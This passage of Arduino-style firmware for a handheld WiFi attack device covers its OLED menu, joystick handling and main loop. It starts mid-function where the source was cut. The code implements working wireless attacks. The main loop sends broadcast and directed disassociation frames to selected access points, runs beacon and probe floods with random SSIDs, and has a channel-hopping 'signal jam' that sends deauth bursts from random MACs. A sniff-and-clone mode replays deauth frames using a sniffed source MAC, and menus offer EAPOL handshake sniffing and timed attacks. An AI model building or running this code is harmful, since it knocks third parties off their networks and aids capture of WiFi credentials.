  else if (disassoc_enabled) sprintf(status, "Ch:%d DIS", currentChannel);
  else if (signal_jam_enabled) sprintf(status, "Ch:%d JAM", currentChannel);
  else if (beacon_flood_enabled) sprintf(status, "Ch:%d BCN", currentChannel);
  else if (probe_flood_enabled) sprintf(status, "Ch:%d PRB", currentChannel);
  else if (deauth_sniff_enabled) sprintf(status, "Ch:%d SNF", currentChannel);
  else if (isSniffing)      sprintf(status, "Ch:%d SNF", currentChannel);
  else if (scan_enabled)    sprintf(status, "Ch:%d SCN", currentChannel);
  else                      sprintf(status, "Ch:%d IDLE", currentChannel);
  display.println(status);
  
  // Separator
  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);
  
  int startY = 12;
  int lineH = 8;
  
  switch (currentMenu) {
    // ====== MAIN MENU ======
    case MENU_MAIN: {
      const int numMainItems = 9;
      const char* items[] = {"Scan", "Attack >", "Stop All",
        "Flood >", "Sniffer >", "Hop On/Off",
        "Config", "Info", "TX Stats"};
      int maxVis = 6; // lines fit below status bar
      int scrollOff = 0;
      if (menuIndex >= maxVis) scrollOff = menuIndex - maxVis + 1;
      for (int i = 0; i < maxVis && (i + scrollOff) < numMainItems; i++) {
        int idx = i + scrollOff;
        display.setCursor(0, startY + i * lineH);
        display.print(idx == menuIndex ? ">" : " ");
        display.setCursor(8, startY + i * lineH);
        display.println(items[idx]);
      }
      break;
    }
    
    // ====== SCAN RESULTS ======
    case MENU_SCAN_RESULTS: {
      int visibleCount = 6;
      int totalItems = scan_results.size();
      if (totalItems > 0) {
        if (menuIndex >= totalItems) menuIndex = totalItems - 1;
        if (menuIndex < 0) menuIndex = 0;
        if (menuIndex < scanResultOffset) scanResultOffset = menuIndex;
        else if (menuIndex >= scanResultOffset + visibleCount) scanResultOffset = menuIndex - visibleCount + 1;
      }
      for (int i = 0; i < visibleCount && (i + scanResultOffset) < totalItems; i++) {
        int idx = i + scanResultOffset;
        const WiFiScanResult& net = scan_results[idx];
        display.setCursor(0, startY + i * lineH);
        display.print(idx == menuIndex ? ">" : " ");
        display.setCursor(6, startY + i * lineH);
        display.print(net.selected ? "X" : " ");
        display.setCursor(12, startY + i * lineH);
        String line = net.ssid.substring(0, 7) + " C" + String(net.channel);
        display.println(line);
      }
      if (totalItems == 0) {
        display.setCursor(8, startY);
        display.println("No networks");
      }
      break;
    }
    
    // ====== ATTACK SUBMENU ======
    case MENU_ATTACK: {
      const int numItems = 6;
      const char* items[] = {"Deauth On", "Disassoc", "Rnd Atk",
        "Single AP", "Signal Jam", "Timer"};
      for (int i = 0; i < numItems; i++) {
        display.setCursor(0, startY + i * lineH);
        display.print(i == menuIndex ? ">" : " ");
        display.setCursor(8, startY + i * lineH);
        display.println(items[i]);
      }
      if (attack_enabled) { display.setCursor(80, startY); display.print("!"); }
      if (disassoc_enabled) { display.setCursor(80, startY + lineH); display.print("!"); }
      if (signal_jam_enabled) { display.setCursor(80, startY + lineH * 4); display.print("!"); }
      if (timedAttackEnabled) { display.setCursor(80, startY + lineH * 5); display.print("!"); }
      break;
    }
    
    // ====== FLOOD SUBMENU ======
    case MENU_FLOOD: {
      const int numItems = 3;
      const char* items[] = {"Beacon Flood", "Probe Flood", "Deauth Sniff"};
      for (int i = 0; i < numItems; i++) {
        display.setCursor(0, startY + i * lineH);
        display.print(i == menuIndex ? ">" : " ");
        display.setCursor(8, startY + i * lineH);
        display.println(items[i]);
      }
      if (beacon_flood_enabled) { display.setCursor(80, startY); display.print("ON"); }
      if (probe_flood_enabled) { display.setCursor(80, startY + lineH); display.print("ON"); }
      if (deauth_sniff_enabled) { display.setCursor(80, startY + lineH * 2); display.print("ON"); }
      break;
    }
    
    // ====== TIMER SUBMENU ======
    case MENU_TIMER: {
      const int numItems = num_timer_presets;
      for (int i = 0; i < numItems; i++) {
        display.setCursor(0, startY + i * lineH);
        display.print(i == menuIndex ? ">" : " ");
        display.setCursor(8, startY + i * lineH);
        display.print(String(timer_presets[i]) + "s");
        if (i == timer_preset_index) { display.print(" *"); }
        display.println();
      }
      break;
    }
    
    // ====== SINGLE AP SELECT ======
    case MENU_SINGLE_AP: {
      int totalItems2 = scan_results.size();
      if (totalItems2 == 0) {
        display.setCursor(8, startY);
        display.println("No networks");
        display.setCursor(8, startY + lineH);
        display.println("Scan first");
      } else {
        int visibleCount = 6;
        if (menuIndex >= totalItems2) menuIndex = totalItems2 - 1;
        if (menuIndex < 0) menuIndex = 0;
        for (int i = 0; i < visibleCount && i < totalItems2; i++) {
          display.setCursor(0, startY + i * lineH);
          display.print(i == menuIndex ? ">" : " ");
          display.setCursor(8, startY + i * lineH);
          String line = scan_results[i].ssid.substring(0, 10) + " C" + String(scan_results[i].channel);
          display.println(line);
        }
      }
      break;
    }
    
    // ====== SNIFFER SUBMENU ======
    case MENU_SNIFFER: {
      const int numSniffItems = 8;
      const char* items[] = {"All", "Beacon", "Probe", "Deauth",
        "EAPOL", "Pwnagotchi", "Stop Sniff", "Hop On/Off"};
      // Show sniff status
      display.setCursor(64, 0);
      if (isSniffing) {
        const char* modes[] = {"ALL", "BCN", "PRB", "DAU", "EAP", "PWN"};
        int mi = (int)currentMode - 1;
        if (mi >= 0 && mi < 6) display.print(modes[mi]);
      }
      if (isHopping) {
        display.setCursor(90, 0);
        display.print("HOP");
      }
      for (int i = 0; i < numSniffItems; i++) {
        display.setCursor(0, startY + i * lineH);
        display.print(i == menuIndex ? ">" : " ");
        display.setCursor(8, startY + i * lineH);
        display.println(items[i]);
      }
      // Show hop status on last item
      display.setCursor(80, startY + 7 * lineH);
      display.println(isHopping ? "ON" : "OFF");
      break;
    }
    
    // ====== CONFIG SUBMENU ======
    case MENU_CONFIG: {
      for (int i = 0; i < numConfigItems; i++) {
        display.setCursor(0, startY + i * lineH);
        display.print(i == menuIndex ? ">" : " ");
        display.setCursor(8, startY + i * lineH);
        display.print(configItems[i]);
        display.setCursor(64, startY + i * lineH);
        switch (i) {
          case 0: display.println(String(start_channel)); break;
          case 1: display.println(String(cycle_delay) + "ms"); break;
          case 2: display.println(String(scan_time) + "ms"); break;
          case 3: display.println(String(num_send_frames)); break;
          case 4: display.println(USE_LED ? "On" : "Off"); break;
          case 5: display.println(isHopping ? "On" : "Off"); break;
        }
      }
      break;
    }
    
    // ====== CONFIG EDIT ======
    case MENU_CONFIG_EDIT: {
      display.setCursor(0, startY);
      display.print("EDIT: ");
      display.println(configItems[configIndex]);
      display.setCursor(0, startY + lineH * 2);
      display.print("Val: ");
      switch (configIndex) {
        case 0: display.println(String(start_channel) + (start_channel >= 36 ? " (5GHz)" : " (2.4GHz)")); break;
        case 1: display.println(String(cycle_delay) + " ms"); break;
        case 2: display.println(String(scan_time) + " ms"); break;
        case 3: display.println(String(num_send_frames)); break;
        case 4: display.println(USE_LED ? "On" : "Off"); break;
        case 5: display.println(isHopping ? "On" : "Off"); break;
      }
      display.setCursor(0, startY + lineH * 4);
      display.println("UP/DN: change");
      display.setCursor(0, startY + lineH * 5);
      display.println("MID/LFT: back");
      break;
    }
    
    // ====== INFO ======
    case MENU_INFO: {
      // Show config info, scrollable
      int scrollOff = (menuIndex < 4) ? menuIndex : 4;
      int line = 0;
      auto printLine = [&](const char* label, const String& val) {
        if (line >= scrollOff && line < scrollOff + 6) {
          display.setCursor(0, startY + (line - scrollOff) * lineH);
          display.print(label);
          display.println(val);
        }
        line++;
      };
      printLine("Ch: ", String(currentChannel));
      printLine("Start Ch: ", String(start_channel));
      printLine("Cycle: ", String(cycle_delay) + "ms");
      printLine("Scan: ", String(scan_time) + "ms");
      printLine("Frames: ", String(num_send_frames));
      printLine("LED: ", USE_LED ? "On" : "Off");
      printLine("Hop: ", isHopping ? "On" : "Off");
      printLine("Atk: ", attack_enabled ? "On" : "Off");
      printLine("Dis: ", disassoc_enabled ? "On" : "Off");
      printLine("TX: ", String(tx_success_count) + "/" + String(tx_fail_count));
      printLine("Bcn: ", beacon_flood_enabled ? "On" : "Off");
      printLine("Prb: ", probe_flood_enabled ? "On" : "Off");
      printLine("Jam: ", signal_jam_enabled ? "On" : "Off");
      printLine("Sniff: ", isSniffing ? "On" : "Off");
      printLine("Tgts: ", String(target_aps.size()));
      printLine("APs: ", String(scan_results.size()));
      break;
    }
    
    // ====== TARGET LIST ======
    case MENU_TARGET_LIST: {
      int totalItems = target_aps.size();
      if (totalItems == 0) {
        display.setCursor(8, startY);
        display.println("No targets");
        display.setCursor(8, startY + lineH);
        display.println("Select in scan");
      } else {
        int visibleCount = 6;
        if (menuIndex >= totalItems) menuIndex = totalItems - 1;
        for (int i = 0; i < visibleCount && i < totalItems; i++) {
          display.setCursor(0, startY + i * lineH);
          display.print(i == menuIndex ? ">" : " ");
          display.setCursor(8, startY + i * lineH);
          display.println(target_aps[i].ssid.substring(0, 14));
        }
      }
      break;
    }
    
    default: break;
  }
  
  display.display();
}

void handleJoystick() {
  // Read all 5 joystick buttons (active LOW with INPUT_PULLUP)
  bool joyState[5];
  for (int i = 0; i < 5; i++) {
    joyState[i] = (digitalRead(joyPins[i]) == LOW);
  }
  
  unsigned long now = millis();
  bool upPressed    = joyState[0] && (now - joyLastPress[0] > JOY_DEBOUNCE_MS);
  bool downPressed  = joyState[1] && (now - joyLastPress[1] > JOY_DEBOUNCE_MS);
  bool leftPressed  = joyState[2] && (now - joyLastPress[2] > JOY_DEBOUNCE_MS);
  bool rightPressed = joyState[3] && (now - joyLastPress[3] > JOY_DEBOUNCE_MS);
  bool midPressed   = joyState[4] && (now - joyLastPress[4] > JOY_DEBOUNCE_MS);
  
  if (upPressed)    joyLastPress[0] = now;
  if (downPressed)  joyLastPress[1] = now;
  if (leftPressed)  joyLastPress[2] = now;
  if (rightPressed) joyLastPress[3] = now;
  if (midPressed)   joyLastPress[4] = now;
  
  switch (currentMenu) {
    // ====== MAIN MENU ======
    case MENU_MAIN: {
      const int numMainItems = 9;
      if (upPressed) {
        menuIndex = (menuIndex - 1 + numMainItems) % numMainItems;
        updateDisplay();
      } else if (downPressed) {
        menuIndex = (menuIndex + 1) % numMainItems;
        updateDisplay();
      } else if (midPressed || rightPressed) {
        switch (menuIndex) {
          case 0: // Scan
            handleCommand("scan");
            currentMenu = MENU_SCAN_RESULTS;
            menuIndex = 0;
            scanResultOffset = 0;
            break;
          case 1: // Attack submenu
            currentMenu = MENU_ATTACK;
            menuIndex = 0;
            break;
          case 2: handleCommand("stop all"); break;
          case 3: // Flood submenu
            currentMenu = MENU_FLOOD;
            menuIndex = 0;
            break;
          case 4: // Sniffer submenu
            currentMenu = MENU_SNIFFER;
            menuIndex = 0;
            break;
          case 5: // Hop toggle
            if (isHopping) handleCommand("hop off");
            else handleCommand("hop on");
            break;
          case 6: // Config submenu
            currentMenu = MENU_CONFIG;
            menuIndex = 0;
            break;
          case 7: // TX Stats / Info
            currentMenu = MENU_INFO;
            menuIndex = 0;
            break;
          case 8: // Targets
            currentMenu = MENU_TARGET_LIST;
            menuIndex = 0;
            break;
        }
        updateDisplay();
      } else if (leftPressed) {
        // No action in main
      }
      break;
    }
    
    // ====== SCAN RESULTS ======
    case MENU_SCAN_RESULTS: {
      int totalItems = scan_results.size();
      if (totalItems == 0) {
        if (leftPressed || midPressed) {
          currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
        }
        break;
      }
      if (upPressed) {
        menuIndex = (menuIndex - 1 + totalItems) % totalItems;
        updateDisplay();
      } else if (downPressed) {
        menuIndex = (menuIndex + 1) % totalItems;
        updateDisplay();
      } else if (leftPressed) {
        currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
      } else if (midPressed) {
        scan_results[menuIndex].selected = !scan_results[menuIndex].selected;
        updateTargetsFromSelected();
        updateDisplay();
      } else if (rightPressed) {
        if (target_mode && !target_aps.empty()) {
          attack_enabled = true;
          Serial1.println("[INFO] Deauth started on selected targets");
          currentMenu = MENU_MAIN; menuIndex = 0;
        } else {
          Serial1.println("[WARN] No targets selected");
        }
        updateDisplay();
      }
      break;
    }
    
    // ====== ATTACK SUBMENU ======
    case MENU_ATTACK: {
      const int numItems = 6;
      if (upPressed) { menuIndex = (menuIndex - 1 + numItems) % numItems; updateDisplay(); }
      else if (downPressed) { menuIndex = (menuIndex + 1) % numItems; updateDisplay(); }
      else if (leftPressed) { currentMenu = MENU_MAIN; menuIndex = 1; updateDisplay(); }
      else if (midPressed || rightPressed) {
        switch (menuIndex) {
          case 0: handleCommand("start deauther"); break;
          case 1: handleCommand("disassoc"); break;
          case 2: handleCommand("random_attack"); break;
          case 3: // Single AP
            if (scan_results.empty()) { Serial1.println("[WARN] Scan first"); }
            else { currentMenu = MENU_SINGLE_AP; menuIndex = 0; }
            break;
          case 4: handleCommand("signal_jam"); break;
          case 5: // Timer
            currentMenu = MENU_TIMER;
            menuIndex = timer_preset_index;
            break;
        }
        updateDisplay();
      }
      break;
    }
    
    // ====== FLOOD SUBMENU ======
    case MENU_FLOOD: {
      const int numItems = 3;
      if (upPressed) { menuIndex = (menuIndex - 1 + numItems) % numItems; updateDisplay(); }
      else if (downPressed) { menuIndex = (menuIndex + 1) % numItems; updateDisplay(); }
      else if (leftPressed) { currentMenu = MENU_MAIN; menuIndex = 3; updateDisplay(); }
      else if (midPressed || rightPressed) {
        switch (menuIndex) {
          case 0: handleCommand("beacon_flood"); break;
          case 1: handleCommand("probe_flood"); break;
          case 2: handleCommand("deauth_sniff"); break;
        }
        updateDisplay();
      }
      break;
    }
    
    // ====== TIMER SUBMENU ======
    case MENU_TIMER: {
      if (upPressed) { menuIndex = (menuIndex - 1 + num_timer_presets) % num_timer_presets; updateDisplay(); }
      else if (downPressed) { menuIndex = (menuIndex + 1) % num_timer_presets; updateDisplay(); }
      else if (leftPressed) { currentMenu = MENU_ATTACK; menuIndex = 5; updateDisplay(); }
      else if (midPressed || rightPressed) {
        timer_preset_index = menuIndex;
        unsigned long durMs = timer_presets[menuIndex] * 1000;
        handleCommand("attack_time " + String(durMs));
        currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
      }
      break;
    }
    
    // ====== SINGLE AP SELECT ======
    case MENU_SINGLE_AP: {
      int totalItems = scan_results.size();
      if (totalItems == 0) {
        if (leftPressed) { currentMenu = MENU_ATTACK; menuIndex = 3; updateDisplay(); }
        break;
      }
      if (upPressed) { menuIndex = (menuIndex - 1 + totalItems) % totalItems; updateDisplay(); }
      else if (downPressed) { menuIndex = (menuIndex + 1) % totalItems; updateDisplay(); }
      else if (leftPressed) { currentMenu = MENU_ATTACK; menuIndex = 3; updateDisplay(); }
      else if (midPressed || rightPressed) {
        handleCommand("single_ap " + String(menuIndex));
        updateDisplay();
      }
      break;
    }
    
    // ====== SNIFFER SUBMENU ======
    case MENU_SNIFFER: {
      const int numSniffItems = 8;
      if (upPressed) {
        menuIndex = (menuIndex - 1 + numSniffItems) % numSniffItems;
        updateDisplay();
      } else if (downPressed) {
        menuIndex = (menuIndex + 1) % numSniffItems;
        updateDisplay();
      } else if (leftPressed) {
        currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
      } else if (midPressed || rightPressed) {
        switch (menuIndex) {
          case 0: handleCommand("start sniff"); break;
          case 1: handleCommand("sniff beacon"); break;
          case 2: handleCommand("sniff probe"); break;
          case 3: handleCommand("sniff deauth"); break;
          case 4: handleCommand("sniff eapol"); break;
          case 5: handleCommand("sniff pwnagotchi"); break;
          case 6: handleCommand("stop sniff"); break;
          case 7: // Toggle hopping
            if (isHopping) handleCommand("hop off");
            else handleCommand("hop on");
            break;
        }
        updateDisplay();
      }
      break;
    }
    
    // ====== CONFIG SUBMENU ======
    case MENU_CONFIG: {
      if (upPressed) {
        menuIndex = (menuIndex - 1 + numConfigItems) % numConfigItems;
        updateDisplay();
      } else if (downPressed) {
        menuIndex = (menuIndex + 1) % numConfigItems;
        updateDisplay();
      } else if (leftPressed) {
        currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
      } else if (midPressed || rightPressed) {
        // Enter edit mode for this config item
        configIndex = menuIndex;
        currentMenu = MENU_CONFIG_EDIT;
        menuIndex = 0;
        updateDisplay();
      }
      break;
    }
    
    // ====== CONFIG EDIT ======
    case MENU_CONFIG_EDIT: {
      if (leftPressed || midPressed) {
        // Save & go back to config list
        currentMenu = MENU_CONFIG;
        menuIndex = configIndex;
        updateDisplay();
      } else if (upPressed) {
        // Increment current value
        switch (configIndex) {
          case 0: start_channel = (start_channel == 1) ? 36 : 1; break; // toggle 1/36
          case 1: cycle_delay = (cycle_delay + 500 < 30000) ? cycle_delay + 500 : 30000; break;
          case 2: scan_time = (scan_time + 500 < 30000) ? scan_time + 500 : 30000; break;
          case 3: num_send_frames = (num_send_frames + 1 < 50) ? num_send_frames + 1 : 50; break;
          case 4: USE_LED = !USE_LED; break;
          case 5: isHopping = !isHopping; break;
        }
        updateDisplay();
      } else if (downPressed) {
        // Decrement current value
        switch (configIndex) {
          case 0: start_channel = (start_channel == 1) ? 36 : 1; break;
          case 1: cycle_delay = (cycle_delay - 500 > 500) ? cycle_delay - 500 : 500; break;
          case 2: scan_time = (scan_time - 500 > 500) ? scan_time - 500 : 500; break;
          case 3: num_send_frames = (num_send_frames - 1 > 1) ? num_send_frames - 1 : 1; break;
          case 4: USE_LED = !USE_LED; break;
          case 5: isHopping = !isHopping; break;
        }
        updateDisplay();
      }
      break;
    }
    
    // ====== INFO ======
    case MENU_INFO: {
      // Scrollable info page
      if (leftPressed) {
        currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
      } else if (upPressed) {
        menuIndex = (menuIndex > 0) ? menuIndex - 1 : 0;
        updateDisplay();
      } else if (downPressed) {
        menuIndex++;
        updateDisplay();
      }
      break;
    }
    
    // ====== TARGET LIST ======
    case MENU_TARGET_LIST: {
      int totalItems = target_aps.size();
      if (totalItems == 0) {
        if (leftPressed || midPressed) {
          currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay();
        }
        break;
      }
      if (upPressed) menuIndex = (menuIndex - 1 + totalItems) % totalItems;
      else if (downPressed) menuIndex = (menuIndex + 1) % totalItems;
      else if (leftPressed) { currentMenu = MENU_MAIN; menuIndex = 0; }
      else if (midPressed) {
        // Remove this target
        target_aps.erase(target_aps.begin() + menuIndex);
        if (menuIndex >= (int)target_aps.size()) menuIndex = ((int)target_aps.size() > 0) ? (int)target_aps.size() - 1 : 0;
        target_mode = !target_aps.empty();
      }
      updateDisplay();
      break;
    }
    
    default:
      if (leftPressed) { currentMenu = MENU_MAIN; menuIndex = 0; updateDisplay(); }
      break;
  }
}

//==========================================================
// Main Loop
//==========================================================
void loop() {

  // TUI updates - joystick navigation
  handleJoystick();
  static unsigned long lastDisplayUpdate = 0;
  if (millis() - lastDisplayUpdate > 500) {
    updateDisplay();
    lastDisplayUpdate = millis();
  }
  // Handle commands from Serial1 (D4/D5 header pins)
  // Only process if we have a full line (newline-terminated) to avoid
  // partial/garbage data from noise triggering commands accidentally
  if (Serial1.available()) {
    String command = Serial1.readStringUntil('\n');
    command.trim();
    // Ignore empty strings and single characters (likely noise)
    if (command.length() > 1) {
      handleCommand(command);
    }
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled) {
      if (scan_between_cycles) {
        Serial1.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks() == 0) {
          printScanResults();
        }
        else {
          Serial1.println("[ERROR] Scan failed.");
        }
      }
      if (target_mode) {
        targetAttack();
      }
      else {
        generalAttack();
      }
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if (disassoc_enabled && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    const std::vector<WiFiScanResult> &aps_to_attack =
      (target_mode && !target_aps.empty()) ? target_aps : scan_results;

    if (aps_to_attack.empty()) {
      Serial1.println("[ERROR] No APs available. Perform a scan or set targets first.");
    } else {
      for (size_t i = 0; i < aps_to_attack.size(); i++) {
        int chRet = wifi_set_channel(aps_to_attack[i].channel);
        if (chRet != 0) {
          Serial1.print("[WARN] wifi_set_channel(");
          Serial1.print(aps_to_attack[i].channel);
          Serial1.print(") failed ret=");
          Serial1.println(chRet);
          continue;
        }

        for (unsigned long j = 0; j < num_send_frames; j++) {
          uint16_t reason = disassoc_reasons[j % num_disassoc_reasons];
          // Broadcast disassoc to all clients
          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);
          // Directed disassoc to AP itself
          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, aps_to_attack[i].bssid, reason);

          if (USE_LED) {
            digitalWrite(LED_B, HIGH);
            delay(30);
            digitalWrite(LED_B, LOW);
          }
          delay(1);  // Inter-frame delay

          Serial1.print("[DISASSOC] Frame ");
          Serial1.print(j + 1);
          Serial1.print(" => ");
          Serial1.print(aps_to_attack[i].ssid);
          Serial1.print(" (");
          Serial1.print(aps_to_attack[i].bssid_str);
          Serial1.print(") on channel ");
          Serial1.println(aps_to_attack[i].channel);
        }
      }
      Serial1.println("[DISASSOC] Disassociation Attack cycle completed.");
    }
  }

  //===============================
  // BEACON FLOOD
  //===============================
  if (beacon_flood_enabled && (millis() - last_beacon_flood >= beacon_flood_delay)) {
    last_beacon_flood = millis();
    // Generate random SSID (8-16 chars)
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(8, 17);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);  // printable ASCII
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_beacon_frame(fakeSSID, ssidLen, currentChannel);
    beacon_flood_count++;
    if (USE_LED) { digitalWrite(LED_B, HIGH); delay(10); digitalWrite(LED_B, LOW); }
    if (beacon_flood_count % 20 == 0) {
      Serial1.print("[BCN FLOOD] ");
      Serial1.print(beacon_flood_count);
      Serial1.println(" beacons sent");
    }
  }

  //===============================
  // PROBE FLOOD
  //===============================
  if (probe_flood_enabled && (millis() - last_probe_flood >= probe_flood_delay)) {
    last_probe_flood = millis();
    // Random SSID probe
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(4, 13);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_probe_req_frame(fakeSSID, ssidLen);
    probe_flood_count++;
    if (USE_LED) { digitalWrite(LED_B, HIGH); delay(5); digitalWrite(LED_B, LOW); }
    if (probe_flood_count % 50 == 0) {
      Serial1.print("[PRB FLOOD] ");
      Serial1.print(probe_flood_count);
      Serial1.println(" probes sent");
    }
  }

  //===============================
  // SIGNAL JAM (rapid channel cycling + deauth)
  //===============================
  if (signal_jam_enabled && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
    last_signal_jam = millis();
    // Cycle through all channels
    int totalChs = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;
    currentChannel = CHANNELS_2GHZ[signal_jam_ch_index];
    wifi_set_channel(currentChannel);
    // Send burst of deauth on this channel
    for (int j = 0; j < 3; j++) {
      uint8_t fakeBSSID[6];
      randomMAC(fakeBSSID);
      wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
    }
    signal_jam_count++;
    if (USE_LED) { digitalWrite(LED_B, !digitalRead(LED_B)); }
    if (signal_jam_count % 50 == 0) {
      Serial1.print("[SIG JAM] ");
      Serial1.print(signal_jam_count);
      Serial1.print(" cycles, ch=");
      Serial1.println(currentChannel);
    }
  }

  //===============================
  // DEAUTH SNIFF-AND-CLONE
  //===============================
  if (deauth_sniff_enabled && has_sniffed_deauth && (millis() - last_deauth_sniff_attack >= deauth_sniff_interval)) {
    last_deauth_sniff_attack = millis();
    // Switch to AP mode briefly to TX, then back to promisc
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    
    // Send deauth from the sniffed source MAC
    for (unsigned long j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(sniffed_deauth_src, dst_mac, deauth_reasons[j % num_deauth_reasons]);
      wifi_tx_deauth_frame(sniffed_deauth_src, sniffed_deauth_src, disassoc_reasons[j % num_disassoc_reasons]);
      delay(1);
    }
    
    Serial1.print("[DEAUTH SNIFF] Cloned ");
    char macBuf[18];
    snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
             sniffed_deauth_src[0], sniffed_deauth_src[1], sniffed_deauth_src[2],
             sniffed_deauth_src[3], sniffed_deauth_src[4], sniffed_deauth_src[5]);
    Serial1.print(macBuf);
    Serial1.println(" and sent deauth");
    
    // Resume sniffing
    has_sniffed_deauth = false;
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    isSniffing = true;
  }
  // Handle channel hopping if enabled
  if (isSniffing) {
    hopChannel();
  }
  
  // Debug: Blink LED slowly to show code is alive
  static unsigned long lastBlink = 0;
  if (millis() - lastBlink > 1000) {
    digitalWrite(10, !digitalRead(10));
    lastBlink = millis();
  }
  
  delay(10);
}
